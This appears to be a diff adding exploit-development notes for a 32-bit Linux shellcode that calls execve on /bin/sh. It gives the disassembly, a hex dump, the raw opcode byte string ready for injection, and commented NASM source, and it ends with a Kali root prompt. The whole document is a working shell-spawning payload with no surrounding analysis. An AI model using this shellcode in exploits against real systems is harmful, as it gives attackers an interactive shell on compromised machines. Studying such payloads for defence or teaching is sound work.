@@ -1,3 +1,69 @@
+-------> shorter version
+
+00001194 <main>:
+    1194:	83 e4 f0             	and    esp,0xfffffff0
+    1197:	31 c9                	xor    ecx,ecx
+    1199:	31 ca                	xor    edx,ecx
+    119b:	e8 08 00 00 00       	call   11a8 <sh>
+    11a0:	2f                   	das    
+    11a1:	62 69 6e             	bound  ebp,QWORD PTR [ecx+0x6e]
+    11a4:	2f                   	das    
+    11a5:	73 68                	jae    120f <__libc_csu_init+0x4f>
+	...
+
+000011a8 <sh>:
+    11a8:	5b                   	pop    ebx
+    11a9:	31 c0                	xor    eax,eax
+    11ab:	b0 0b                	mov    al,0xb
+    11ad:	cd 80                	int    0x80
+    11af:	bb 00 00 00 00       	mov    ebx,0x0
+    11b4:	b8 01 00 00 00       	mov    eax,0x1
+    11b9:	cd 80                	int    0x80
+    11bb:	90                   	nop
+    11bc:	90                   	nop
+
+
+
+ 1190 90909090 83e4f031 c931cae8 08000000  .......1.1......
+ 11a0 2f62696e 2f736800 5b31c0b0 0bcd80bb  /bin/sh.[1......
+
+
+;---------------------------------------------------------------------------------
+
+83 e4 f0 31 c9 31 ca e8 08 00 00 00 2f 62 69 6e 2f 73 68 00 5b 31 c0 b0 0b cd 80
+
+;---------------------------------------------------------------------------------
+
+
+global main
+
+section .text
+	db 0x90, 0x90, 0x90, 0x90	; nop, nop ..
+main:
+	and esp, 0xfffffff0		; align stack
+	xor ecx, ecx			; ecx = 3rd param to execve
+	xor edx, ecx			; edx = 2nd param to execve (argv)
+	call sh				; push string on stack
+	db '/bin/sh',0
+sh:	pop ebx				; pop string into ebx = 1st param to execve
+	xor eax, eax
+	mov al, 11			; 11 = sys_execve
+	int 0x80			; syscall
+	mov ebx, 0			; exit code 0
+	mov eax, 1			; sys_exit
+	int 0x80			; syscall
+	
+	db 0x90, 0x90, 0x90, 0x90	; nop, nop
+
+
+
+
+
+
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 root@kali:~# cat shell.asm 
 
 global main
